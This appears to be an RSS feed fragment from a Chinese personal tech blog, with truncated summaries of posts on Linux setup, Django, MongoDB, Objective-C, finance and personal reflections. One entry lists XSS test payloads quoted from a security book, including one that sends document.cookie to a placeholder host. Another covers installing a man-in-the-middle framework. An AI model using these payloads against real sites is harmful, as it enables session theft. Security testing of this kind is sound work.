    </item>
    
    <item>
      <title>postgresql无法启动问题</title>
      <link>/posts/postgresql%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/</link>
      <pubDate>Wed, 27 May 2015 10:52:36 +0000</pubDate>
      
      <guid>/posts/postgresql%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/</guid>
      <description>今天升级系统后，发现postgresql无法启动了，报错/etc/ssl/private/ssl-cert-snakeoil.key: Permission denied。
一看就是权限问题，首先看这个文件是什么权限：
# ls -al /etc/ssl/private/ssl-cert-snakeoil.key -rw-r----- 1 root ssl-cert 1704 Jul 22 2014 /etc/ssl/private/ssl-cert-snakeoil.</description>
    </item>
    
    <item>
      <title>centos6搭建在线web代理</title>
      <link>/posts/centos6%E6%90%AD%E5%BB%BA%E5%9C%A8%E7%BA%BFweb%E4%BB%A3%E7%90%86/</link>
      <pubDate>Sun, 17 May 2015 16:12:00 +0000</pubDate>
      
      <guid>/posts/centos6%E6%90%AD%E5%BB%BA%E5%9C%A8%E7%BA%BFweb%E4%BB%A3%E7%90%86/</guid>
      <description>最近有个需求需要搭建一个在线web代理，懒得自己写就找到两个php程序：
 knProxy:https://github.com/jabbany/knProxy glype:https://www.glype.com/download.php  从部署角度来讲这两个都很简单，功能上也很类似，这里我就以第二个为例吧，使用nginx来部署。先来安装nginx和php-fpm
yum install nginxyum install php-fpm&amp;lt;/pre&amp;gt;下载glype后解压到/var/www/html/glype目录，并在/etc/nginx/conf.</description>
    </item>
    
    <item>
      <title>理财记录3</title>
      <link>/posts/%E7%90%86%E8%B4%A2%E8%AE%B0%E5%BD%953/</link>
      <pubDate>Sun, 26 Apr 2015 21:02:18 +0000</pubDate>
      
      <guid>/posts/%E7%90%86%E8%B4%A2%E8%AE%B0%E5%BD%953/</guid>
      <description>&lt;p&gt;上篇中主要学习了和企业盈利能力相关的知识，这篇中记录一下和企业偿债能力相关的知识，可能对于购买债券的朋友来说更看重这点吧。但我在学习过程中始终有一种似懂非懂的感觉，而没有学习关于盈利能力时那种“AHA~Get It!”的感觉，所以这里只做一些简单记录。&lt;/p&gt;
&lt;p&gt;首先，企业是否会陷入财务困境可以从3方面来看：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;财务状况&lt;/li&gt;
&lt;li&gt;盈利能力&lt;/li&gt;
&lt;li&gt;周转速度&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;同时衡量偿债能力的指标又有下面4种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;资产负债率&lt;/li&gt;
&lt;li&gt;流动比率&lt;/li&gt;
&lt;li&gt;速动比率&lt;/li&gt;
&lt;li&gt;利息保障倍数&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>使用firewalld-cmd配置防火墙</title>
      <link>/posts/%E4%BD%BF%E7%94%A8firewalld-cmd%E9%85%8D%E7%BD%AE%E9%98%B2%E7%81%AB%E5%A2%99/</link>
      <pubDate>Thu, 23 Apr 2015 17:44:52 +0000</pubDate>
      
      <guid>/posts/%E4%BD%BF%E7%94%A8firewalld-cmd%E9%85%8D%E7%BD%AE%E9%98%B2%E7%81%AB%E5%A2%99/</guid>
      <description>CentOS7和fedora中的默认防火墙都变成了firewalld，当然你也可以选择禁用这个并自己安装iptables，下面内容原文：这里，而且只翻译我用到的部分文章。原文中还展示了如何使用图形界面进行配置，不过作为键盘爱好者，能不用鼠标的就尽量不用鼠标了，直接上命令行操作。
 4.5.4 理解域概念 firewalld可以根据不同的信任级别，将处于不同域内的设备进行分离。NetworkManager用于管理firewalld将接口分配到哪个域中，可以通过NetworkManager界面或filrewall-config工具来进行设置。
默认的配置文件位于/etc/firewalld/可以快速的应用在网络接口上，这里有一份关于域的简短的说明：
dorp:任何入站请求都被忽略，无任何回复，只有发起的网络链接请求被放行。
block:任何入站请求都被拒绝，ipv4协议回复&amp;quot;icmp-host-prohibited&amp;quot;消息，ipv6协议回复&amp;quot;icmp6-adm-prohibited&amp;rdquo;，只有从系统内部发出的链接请求才被放行。
（个人感觉上面两个区别就是在于有无回复，对内的话用block、对外用dorp好一些，让外部扫描费点劲才知道被防火墙过滤了）
public:为在公共场所准备，你不相信网络中的其他电脑不会对你的电脑造成伤害，只有被选定的入站链接被接受。</description>
    </item>
    
    <item>
      <title>fedora21安装有道词典linux版</title>
      <link>/posts/fedora21%E5%AE%89%E8%A3%85%E6%9C%89%E9%81%93%E8%AF%8D%E5%85%B8linux%E7%89%88/</link>
      <pubDate>Wed, 22 Apr 2015 16:18:19 +0000</pubDate>
      
      <guid>/posts/fedora21%E5%AE%89%E8%A3%85%E6%9C%89%E9%81%93%E8%AF%8D%E5%85%B8linux%E7%89%88/</guid>
      <description>今天发现有道词典出了linux版，不过万恶的只有deepin和ubuntu的安装包，作为忠实的红帽系用户只能下源码了。首先从 http://cidian.youdao.com/index-linux.html 选择二进制安装包并解压。
这里注意2个地方，首先fedora21默认为qt4，python2.7，而有道词典需要qt5以及python3，所以先要去官网下载QT5离线安装版（个人建议，我这在线安装qt5慢的不可忍受）。下载完成我们得到qt-opensource-linux-x64-5.4.1.run添加执行权限后执行即可。
安装完成后进入到解压后的有道词典目录，我这里叫youdao-dict_1.0.2~binary_amd64，给里面的install.sh添加执行权限并执行即可。
接下来到了最纠结的地方了，我们要手动安装各个依赖，这里我就直接给出经过N次失败后成功的结果把，下面这些都要用yum命令安装：
yum install python3-qt5yum install python3-requestsyum install python3-xlibyum install python3-lxmlyum install python3-pillowyum install tesseract-langpack-chi_simyum install tesseract-langpack-chi_trayum install qt5-qtquickcontrolsyum install qt5-qtgraphicaleffects都安装完成后就可以用了，支持取词、划词，不过取词识别度还有待提高，划词翻译比较好用。当然了，如果你想更geek一点，可以安装openyoudao也很酷。</description>
    </item>
    
    <item>
      <title>理财记录2</title>
      <link>/posts/%E7%90%86%E8%B4%A2%E8%AE%B0%E5%BD%952/</link>
      <pubDate>Sun, 19 Apr 2015 14:47:01 +0000</pubDate>
      
      <guid>/posts/%E7%90%86%E8%B4%A2%E8%AE%B0%E5%BD%952/</guid>
      <description>&lt;p&gt;这个月拿到了人生中第一笔5位数薪水，可仔细一看，税、五险一金居然扣了将近2K！这可把我肉疼坏了，正好最近看到了关于和税有关的会计知识，发现当老板也不容易啊！就拿所得税来说，不管你利润多少，先把25%交上去再说，颇有“此路是我开，此树是我栽，要想过此路，留下买路财”的味道。呃……不知道这么说会不会被跨省——我纳税，我光荣！&lt;/p&gt;
&lt;p&gt;上篇记录主要是说了金钱的时间成本，这篇主要和财务报表有关，但相关的会计概念实在太多，我在学习时3页书就记了整整6页A4纸的笔记，所以在这里可能不会解释相关的概念了，有需要的自行百度。老规矩先来个声明：本人非科班出身，所记录均为个人学习心得，不保证正确性、时效性。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>理财纪录1</title>
      <link>/posts/%E7%90%86%E8%B4%A2%E7%BA%AA%E5%BD%951/</link>
      <pubDate>Fri, 10 Apr 2015 00:07:07 +0000</pubDate>
      
      <guid>/posts/%E7%90%86%E8%B4%A2%E7%BA%AA%E5%BD%951/</guid>
      <description>&lt;p&gt;复利是什么？爱因斯坦说它是世界第八大奇迹。下面涉及到复利终值和现值、普通年金终值和现值、预付年金终值与现值、偿债基金、年资本回收额等初级会计知识，本人非会计出身，下面说的仅凭个人理解，如有错误恳请指正。&lt;/p&gt;
&lt;p&gt;复利终值是什么？简言之就是今年的x元钱，在保持q%的利率或利率下，相当于n年后多少钱。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>django-userena使用记录</title>
      <link>/posts/django-userena%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</link>
      <pubDate>Thu, 09 Apr 2015 17:31:47 +0000</pubDate>
      
      <guid>/posts/django-userena%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</guid>
      <description>django-userena扩展了django原生的用户系统，提供了注册、登录、修改密码、邮件验证等一系列常用功能。直接使用pip安装即可：pip install django-userena
会自动安装其所需的依赖包，不过个人建议为了更好的定制模板或相关功能，把这个包放到项目目录下当作一个app更方便一些。安装完成后修改settings.py，首先来创建一个app用于扩展用户系统 python manage.py startapp accounts 然后修改Models.py来扩展原生用户字段，我这里以添加用户等级为例：
# coding=utf-8 from django.</description>
    </item>
    
    <item>
      <title>MacOS安装Wireshark-qt</title>
      <link>/posts/macos%E5%AE%89%E8%A3%85wiresharkqt/</link>
      <pubDate>Mon, 06 Apr 2015 11:29:54 +0000</pubDate>
      
      <guid>/posts/macos%E5%AE%89%E8%A3%85wiresharkqt/</guid>
      <description>大名鼎鼎的Wireshark不必多说，在win、linux系统中安装也都比较便捷，不过在网上大多写MacOS中如何安装的都狠麻烦，因为他们写的都是安装gtk版本的方式，而wireshark早就投入了qt阵营的怀抱了。
在brew中直接使用brew install wireshark --with-qt即可安装成功，不过安装后会提示:
&amp;gt; If your list of available capture interfaces is empty&amp;gt; (default OS X behavior), try the following commands:&amp;gt; curl https://bugs.</description>
    </item>
    
    <item>
      <title>fedora21安装MITMf框架</title>
      <link>/posts/fedora21%E5%AE%89%E8%A3%85mitmf%E6%A1%86%E6%9E%B6/</link>
      <pubDate>Thu, 02 Apr 2015 14:42:02 +0000</pubDate>
      
      <guid>/posts/fedora21%E5%AE%89%E8%A3%85mitmf%E6%A1%86%E6%9E%B6/</guid>
      <description>关于这大名鼎鼎的中间人攻击框架不多介绍了，如果是kali linux用户直接apt-get install mitmf即可;如果是win用户呢，基本就放弃吧;如果是os x用户呢，有几个依赖我始终安装失败，你要安装成功了请联系我。
网上很多都是讲ubuntu怎么安装这个框架的，这里我记录一下在fedora21上我的安装记录。
首先安装一些系统依赖，这里我系统原来就安装了很多杂七杂八的东西，不保证下面的就是齐全的：
sudo yum install libnetfilter_queue-develsudo yum install libffi-develsudo yum install libpcap-devel接下来下载一个不能用pip安装的包</description>
    </item>
    
    <item>
      <title>滕王阁序</title>
      <link>/posts/%E6%BB%95%E7%8E%8B%E9%98%81%E5%BA%8F/</link>
      <pubDate>Sun, 29 Mar 2015 23:58:12 +0000</pubDate>
      
      <guid>/posts/%E6%BB%95%E7%8E%8B%E9%98%81%E5%BA%8F/</guid>
      <description>时隔多年，又偶然看见了高中课堂上学过的《滕王阁序》，突然明白了当时语文老师为什么能那么充满激情的讲解，有些东西——没有一定的年龄和阅历是看不懂的。 以前只是觉得这是要求背诵的课文，真讨厌。但是现在读到
 “嗟乎！时运不齐，命途多舛。**冯唐易老，李广难封。**屈贾谊于长沙，非无圣主；窜梁鸿于海曲，岂乏明时？所赖君子见机，达人知命。**老当益壮，宁移白首之心？穷且益坚，不坠青云之志。**酌贪泉而觉爽，处涸辙以犹欢。北海虽赊，扶摇可接；东隅已逝，桑榆非晚。孟尝高洁，空余报国之情；阮籍猖狂，岂效穷途之哭！” 心中却有了不可名状的触动。每个人都渴望做出名留青史的一番事业，但更多数的人却过完了普普通通的一生。或许是因为最近有些焦躁，觉得自己都这个年龄了却还一事无成才会有所触动吧。明知道这种事急不来，却依然恨不得明天就能做出一番轰轰烈烈的大事来。最近最明显的一个感觉就是，以前日子是一天一天过的，现在是一周一周过的，再过几年就是一个月一个月过的了吧。 突然想起丰子恺的一句话：孩子，我多么羡慕你们！羡慕你们的现在的生活！但是当你们明白我这句话的时候，你们已经不再令我羡慕了。就好像，长大了才知道《麦兜》不是给孩子看的，《幽游白书》的结局为什么那么平淡。
 有人说，以前看《大话西游》看着看着就笑了，现在却是看着看着就哭了。虽然再次重温经典的时候我没有哭，却笑不出来了。以前一直觉得片尾夕阳武士对着悟空背影说的那句“他好像一条狗”十分突兀，不明所以。现在明白，电影中表明至尊宝最后顿悟了，带上头箍是为了保护唐僧取经，让大众脱离苦海，而非单单为了拯救紫霞。选择事业放弃爱情，却抹不掉心中的那个人影，这也就是最后悟空借夕阳武士之口对自己说“你好像一条狗”的原因吧。
你好像一条狗。</description>
    </item>
    
    <item>
      <title>NodeJS学习记录1</title>
      <link>/posts/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/</link>
      <pubDate>Thu, 19 Mar 2015 17:03:56 +0000</pubDate>
      
      <guid>/posts/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/</guid>
      <description>本来学oc学的正爽，结果由于某些原因必须先学习NodeJS，所以oc的学习就先暂停一段时间吧。这几天恶补了相关基础知识，如果oc只是语法上让我不太习惯的话，那nodejs就是从编程思想上将原来所学的知识进行了颠覆。至于nodejs相关介绍、优缺点等这里就不多说了，如果想在学习过程中不“一头雾水”，就要理解几个概念：同步/异步、阻塞/非阻塞、闭包、回调、事件轮循。
本人以前并没有任何javascript语言的学习经验，这里仅仅记录我这几天学习的理解，如有什么偏颇，还望大家指正。
首先，nodejs是单线程的，同时只能进行一项任务。这点引起较大的批评就是无法利用多核CPU的能力，但同时在多个CPU运行程序也并不是完美的，因为想要多个CPU有效的拆分任务并执行，它们之间需要频繁的交换信息，比如当前执行状态、各自完成了哪些操作等。
关于上面的几个概念，网上答案五花八门都有，不过我更倾向于下面的答案，引用于知乎，原文链接：
 “阻塞”与&amp;quot;非阻塞&amp;quot;与&amp;quot;同步&amp;quot;与“异步&amp;quot;不能简单的从字面理解，提供一个从分布式系统角度的回答。
  1.同步与异步
  同步和异步关注的是消息通信机制 (synchronous communication/ asynchronous communication)</description>
    </item>
    
    <item>
      <title>MongoDB集群部署——Replica Set</title>
      <link>/posts/mongodb%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2replica-set/</link>
      <pubDate>Tue, 03 Mar 2015 13:07:28 +0000</pubDate>
      
      <guid>/posts/mongodb%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2replica-set/</guid>
      <description>mongodb的集群部署有3种方式，这里记录我在使用Replica Set（副本集）部署时的步骤。
首先这种方式至少需要3个节点——主、备、仲裁节点。主备节点存储数据，仲裁节点不存储数据，负责决定主节点挂掉之后哪个备节点升级为主节点。客户端同时连接主节点与备节点，不连接仲裁节点。
安装mongodb，CentOS下安装rpmfusion源后使用yum安装即可:yum install mongodb mongodb-server
安装完成后，修改/etc/mongodb.conf 这个配置文件。
bind_ip = 192.</description>
    </item>
    
    <item>
      <title>django重写model的save方法实现同时写2个数据库</title>
      <link>/posts/django%E9%87%8D%E5%86%99model%E7%9A%84save%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E5%90%8C%E6%97%B6%E5%86%992%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</link>
      <pubDate>Sat, 28 Feb 2015 11:10:28 +0000</pubDate>
      
      <guid>/posts/django%E9%87%8D%E5%86%99model%E7%9A%84save%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E5%90%8C%E6%97%B6%E5%86%992%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</guid>
      <description>最近有个需求就是当执行save时需要把数据写入2个数据库，查看文档后发现直接重写save方法比较简单。
首先建立2个测试数据库testa和testb，然后在settings中配置数据库：
DATABASES = {&amp;#39;default&amp;#39;: {&amp;#39;ENGINE&amp;#39;: &amp;#39;django.db.backends.mysql&amp;#39;,&amp;#39;NAME&amp;#39;: &amp;#39;testa&amp;#39;,&amp;#39;USER&amp;#39;: &amp;#39;root&amp;#39;,&amp;#39;PASSWORD&amp;#39;: &amp;#39;asdasd&amp;#39;,&amp;#39;HOST&amp;#39;: &amp;#39;192.</description>
    </item>
    
    <item>
      <title>OC学习第2天——CLASS</title>
      <link>/posts/oc%E5%AD%A6%E4%B9%A0%E7%AC%AC2%E5%A4%A9class/</link>
      <pubDate>Wed, 11 Feb 2015 22:01:04 +0000</pubDate>
      
      <guid>/posts/oc%E5%AD%A6%E4%B9%A0%E7%AC%AC2%E5%A4%A9class/</guid>
      <description>在新建文件时选择os x列表下的“source”，再从右面的选项中选择“cocoa class”，填写类名以及选择存储位置后会自动生成2个文件：一个.h文件和一个.m文件，格式如下
student.h:
#import &amp;lt;Foundation/Foundation.h&amp;gt;@interface Student : NSObject@end&amp;lt;/pre&amp;gt;student.</description>
    </item>
    
    <item>
      <title>OC学习第1天——hello world</title>
      <link>/posts/oc%E5%AD%A6%E4%B9%A0%E7%AC%AC1%E5%A4%A9hello-world/</link>
      <pubDate>Mon, 09 Feb 2015 23:36:27 +0000</pubDate>
      
      <guid>/posts/oc%E5%AD%A6%E4%B9%A0%E7%AC%AC1%E5%A4%A9hello-world/</guid>
      <description>很多人为了学习ios开发而买了mac，而我却正好相反——买了mac后觉得只拿来看看网页、管理服务器什么的太浪费了，就顺便把ios开发也学学吧。由于本人是oc初学者，若有错误的地方还请指正。本文使用os x 10.10.2以及xcode 6.1.1。
这里首先面临的就是语言的选择——oc和swift。经过“深思熟虑”我还是选择了oc，因为相关的资料比较多，遇到问题google起来效果较好。很多人觉得ios开发很难学是因为oc——别的不敢讲，就我这两天的学习来看，oc虽说是c的超集，不过语法看起来题确实挺奇怪，但对于任何有其他语言开发基础的人来说，语法仅仅是一个需要习惯的过程。ios开发的真正难点在于cocos引擎部分，所以对于英语好的来说swift也是不错的选择（英语硬伤还是啊……）。
直接从appstore中安装xcode，安装完成后运行选择“create a new Xcode project”，再选择os x列表下的“application”，然后在右边的窗口中选择“command line tool”，点击“next”后输入项目名称等相关信息，语言选择“Objective－c”，再选择保存位置后点击“finish”即可。</description>
    </item>
    
    <item>
      <title>python中的md5以及base64加密</title>
      <link>/posts/python%E4%B8%AD%E7%9A%84md5%E4%BB%A5%E5%8F%8Abase64%E5%8A%A0%E5%AF%86/</link>
      <pubDate>Thu, 05 Feb 2015 13:58:41 +0000</pubDate>
      
      <guid>/posts/python%E4%B8%AD%E7%9A%84md5%E4%BB%A5%E5%8F%8Abase64%E5%8A%A0%E5%AF%86/</guid>
      <description>最近要和某公司进行系统对接，对方使用C#给出了这样一个加密函数：
public static string MD5ToBase64String(string str){MD5 md5 = new MD5CryptoServiceProvider();byte[] temp = System.</description>
    </item>
    
    <item>
      <title>安装MYSQL后的10种调优方法（翻译）</title>
      <link>/posts/%E5%AE%89%E8%A3%85mysql%E5%90%8E%E7%9A%8410%E7%A7%8D%E8%B0%83%E4%BC%98%E6%96%B9%E6%B3%95%E7%BF%BB%E8%AF%91/</link>
      <pubDate>Thu, 22 Jan 2015 18:22:24 +0000</pubDate>
      
      <guid>/posts/%E5%AE%89%E8%A3%85mysql%E5%90%8E%E7%9A%8410%E7%A7%8D%E8%B0%83%E4%BC%98%E6%96%B9%E6%B3%95%E7%BF%BB%E8%AF%91/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://www.percona.com/blog/2014/01/28/10-mysql-settings-to-tune-after-installation/&#34;&gt;原文&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;当我们被聘请去做MYSQL性能审计时，我们被期望审查MYSQL配置文件并提出改进建议。在大多数情况下很多人都感到惊奇，因为我们仅仅在成百上千的变量中改变了很少的一部分。这篇文章的目的就是告诉你一些至关重要的设置项。
我们在几年前曾经在博客中给出过一些建议，但从那之后MYSQL的世界发生了很多改变！&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>HAPROXY&#43;KEEPALIVE构建高可用集群</title>
      <link>/posts/haproxy-keepalive%E6%9E%84%E5%BB%BA%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4/</link>
      <pubDate>Mon, 19 Jan 2015 17:43:32 +0000</pubDate>
      
      <guid>/posts/haproxy-keepalive%E6%9E%84%E5%BB%BA%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4/</guid>
      <description>新增一台HA节点192.168.0.155，虚拟IP192.168.0.160，其它IP见上文。
安装KEEPALIVE:yum install keepalived
分别在151和155 安装完成后，修改/etc/keepalived/keepalived.conf，我使用151作为主节点，155为备节点。
151配置如下：
! Configuration File for keepalivedglobal_defs {notification_email {test@xxx.</description>
    </item>
    
    <item>
      <title>RMBP我的记录</title>
      <link>/posts/rmbp%E6%88%91%E7%9A%84%E8%AE%B0%E5%BD%95/</link>
      <pubDate>Sun, 18 Jan 2015 13:58:11 +0000</pubDate>
      
      <guid>/posts/rmbp%E6%88%91%E7%9A%84%E8%AE%B0%E5%BD%95/</guid>
      <description>不出意料的，2015计划单中首先完成了“其它”——换台新电脑。新电脑已经入手半个多月了，记录一下这段时间我是怎么折腾的。
作为一名忠实的键盘党，感觉MBP的触控板简直爽爆了，在告别鼠标的道路上又进一步，而且“合盖就走，无需关机”这点也让我很喜欢。最初的时候可能需要重新熟悉一下os x的快捷键（不改键盘键位映射的情况下），command键取代了ctrl键的大部分功能，比如复制、粘贴、切换输入法一类的。再比如网页刷新是command+r而非F5，这里推荐第一款软件——cheatsheet。
这个小东西的作用就是当你长按command键时显示常用快捷键，不仅是系统级别的，而且还包含了软件层面的。
第二个推荐的软件就是alfred，相信使用os x的没有不知道这个的吧？绝对是os x下的第一效率神器。
另外，虽说os x也算是*unix家族的成员，但从习惯了linux的强大的包管理功能后还是希望能在ox s中也有类似功能，于是请出os x下的包管理大师——homebrew。</description>
    </item>
    
    <item>
      <title>选择漏洞扫描器时需要注意的几点（翻译）</title>
      <link>/posts/%E9%80%89%E6%8B%A9%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%E6%97%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%87%A0%E7%82%B9%E7%BF%BB%E8%AF%91/</link>
      <pubDate>Thu, 08 Jan 2015 14:18:16 +0000</pubDate>
      
      <guid>/posts/%E9%80%89%E6%8B%A9%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%E6%97%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%87%A0%E7%82%B9%E7%BF%BB%E8%AF%91/</guid>
      <description>这是翻译系列的第一篇，如有不足希望大家指出。 原文：http://www.acunetix.com/blog/articles/choosing-a-web-vulnerability-scanner/
 评估一个网站漏洞扫描器的好坏并不容易，随着大量的开源或商业的扫描器不断涌出，它们都声称自己提供了最好的扫描功能，所以选择一个好的扫描器是一个重要而又艰难的决定。在这篇文章中，我们提供了几个当您选择扫描器时可以考虑的关键之处。
易用 漏洞扫描早就不再是一件容易的事情，虽然（希望）很多人都了解如SQL注入、XSS一类的基础知识，但并不是所有操作扫描器的人都是相关专家。理想情况下，你的大部分时间应该用于修复扫描器发现的漏洞而不是学习如何使用扫描器。
有广泛的安全测试 漏洞扫描器应该能识别出更多的漏洞。尽管现在大多数的扫描器都能识别出一些基本、常见的漏洞，但你选择的扫描器最好也能识别出那些不太常见的漏洞。
能识别漏洞变种 一个好的扫描器除了能识别出大量的漏洞外，应该也能识别检测出这些漏洞的相关变种。用XSS举例来说，开发者可能修复了基本的XSS漏洞，但却不能防止经过编码后XSS漏洞攻击。</description>
    </item>
    
    <item>
      <title>Percona XtraDB Cluster&#43;HAProxy配置</title>
      <link>/posts/percona-xtradb-cluster-haproxy%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Tue, 06 Jan 2015 17:33:37 +0000</pubDate>
      
      <guid>/posts/percona-xtradb-cluster-haproxy%E9%85%8D%E7%BD%AE/</guid>
      <description>最近公司有个异地多机房数据同步需求，mysql原生支持双主同步，所以只能另寻他法，于是找到了Percona XtraDB Cluster。这个可以理解为给Mysql打了个补丁，以便支持多主同步。
测试环境：centos 6.5
IP分配:
 192.168.0.154(DB) 192.168.0.152(DB) 192.168.0.153(DB) 192.</description>
    </item>
    
    <item>
      <title>你好，2015！</title>
      <link>/posts/%E4%BD%A0%E5%A5%BD2015/</link>
      <pubDate>Thu, 01 Jan 2015 00:12:38 +0000</pubDate>
      
      <guid>/posts/%E4%BD%A0%E5%A5%BD2015/</guid>
      <description>翻出去年写的年度计划，发现14年的完成度一般，还需努力啊！
完成事项：  毕业证 驾照 户口  语言方面：  英语略有进步，粤语毫无建树&amp;hellip;&amp;hellip;  身体方面：  早起早睡坚持的不错。 回校答辩期间以及天气变冷后锻炼计划泡汤，啤酒肚趋势略发明显&amp;hellip;&amp;hellip;  生活方面：  厨艺部分，除了抽风一样下过几次厨之外，基本处于停滞状态&amp;hellip;&amp;hellip; 练字？貌似都很久不写字了&amp;hellip;&amp;hellip; 旅游计划彻底破产&amp;hellip;&amp;hellip;  经济方面：  由于5-7月回校答辩、考驾照，故本年度收入减少，但支出却大幅增长。其中信用卡消费占比将近80%，需要引起警惕。  阅读方面：  去年一共阅读书籍18本（耗时2天+的），其中技术类8本，小说3本，经济2本，其它类5本，较全职学生时代大幅度减少。  交际方面：  都说程序员“钱多话少死的早”，从个人角度来说，“钱多”没看出来，“话少”倒是真的。有些时候居然能一天都不和任何人说话，这点急需改善。  工作方面：  虽说是个开发，但这一年大部分工作都是围绕运维展开的，仅编写2套程序也都是和服务器部署、监控有关的。不过运维也为我打开了另一个窗口，收获颇丰，努力发展成运维+后台的复合人才。  最有成就的事：  2个月时间精读完了《思考，快与慢》这个砖头。总结一句话就是：大部分时间不要相信直觉！ 某一天老大不在，公司服务器故障导致全公司业务停止。在2小时内修复问题减少公司几万美金损失（话说是不是该申请个奖金神码的哈哈）  最挫败的事：  英语被香港大妈完爆好几条街&amp;hellip;&amp;hellip;让我哭一会先&amp;hellip;&amp;hellip;  总结： 经济方面：  改变记账方式，将每一笔信用卡支出都详细记录，而不是全部混杂在一起。同时开源节流并行，寻找副业机会以及减少非必要支出，争取早日摆脱信用卡泥潭。 争取募集的种子资金达到年10%收益率。  语言方面：  阅读2本英文原著，学习5首英文歌，其中至少一首可以去KTV秀一下的。 每个月看1部粤语电影。  身体方面：  增重10斤的同时保持腹部的平坦。 每星期抽出30分钟进行冥想。  交际方面：  每天都要和家人朋友扯淡10分钟以上。  阅读方面：  简单的书每周一本，技术类或需要精读的书争取每个月一本。  生活方面：  学习糖醋鸡蛋做法。 先去把欢乐谷的刺激项目玩一圈，有机会的话去蹦极。  其他：  换台新电脑。  你好！本命咩咩年！</description>
    </item>
    
    <item>
      <title>fedora21开机执行某命令</title>
      <link>/posts/fedora21%E5%BC%80%E6%9C%BA%E6%89%A7%E8%A1%8C%E6%9F%90%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Fri, 26 Dec 2014 09:54:17 +0000</pubDate>
      
      <guid>/posts/fedora21%E5%BC%80%E6%9C%BA%E6%89%A7%E8%A1%8C%E6%9F%90%E5%91%BD%E4%BB%A4/</guid>
      <description>作为一名手贱党，昨天又把电脑折腾残废了。那就顺便升级成最新的fedora21吧。从18开始，fedora默认rc.local文件不存在，所以需要以root用户执行
sudo touch /etc/rc.d/rc.localsudo chmod 755 /etc/rc.d/rc.local然后编辑这个文件，比如：
#!/bin/shmount /dev/sdb1 /mnt/files/exit 0重启即可。</description>
    </item>
    
    <item>
      <title>xss测试用例</title>
      <link>/posts/xss%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/</link>
      <pubDate>Wed, 10 Dec 2014 21:43:58 +0000</pubDate>
      
      <guid>/posts/xss%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/</guid>
      <description>摘录于《XSS跨站脚本攻击剖析与防御》，希望大家支持正版，写的还是不错的。
&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;);&amp;lt;/script&amp;gt; &amp;lt;script src=&amp;#34;xxx://xxx.xxx&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;location.href=&amp;#34;xxx://xxx.xx/cookie=&amp;#34;+escape(document.cookie)&amp;lt;/script&amp;gt; &amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;alert(&amp;#39;xss&amp;#39;);&amp;lt;/scr&amp;lt;script&amp;gt;ipt&amp;gt; &amp;lt;script&amp;gt;alert(String.</description>
    </item>
    
    <item>
      <title>不可被证明的爱</title>
      <link>/posts/%E4%B8%8D%E5%8F%AF%E8%A2%AB%E8%AF%81%E6%98%8E%E7%9A%84%E7%88%B1/</link>
      <pubDate>Sun, 07 Dec 2014 11:29:48 +0000</pubDate>
      
      <guid>/posts/%E4%B8%8D%E5%8F%AF%E8%A2%AB%E8%AF%81%E6%98%8E%E7%9A%84%E7%88%B1/</guid>
      <description>&lt;p&gt;文/丛非从&lt;/p&gt;
&lt;p&gt;自我价值感低的人，往往需要被证明才能相信自己被爱，而且证明需要持续不断。而恰恰又是这些证明，将爱渐渐淡化。无数在感情里挫败着的人，经历着这样的悲剧故事。&lt;/p&gt;
&lt;p&gt;这很像那个笑话，某女不相信自己是被丈夫爱也不相信自己值得被丈夫专一的，所以总是去验证丈夫的专一：每天回来都要搜索丈夫身上有没有女人的头发。直到没有搜到，还是嚎啕大哭，丈夫不解的问到没有搜到女人头发证明我很专一，你还哭个啥。该女的一席话曾让无数人汗颜：你这挨千刀的，在外面居然连尼姑也要了。&lt;/p&gt;
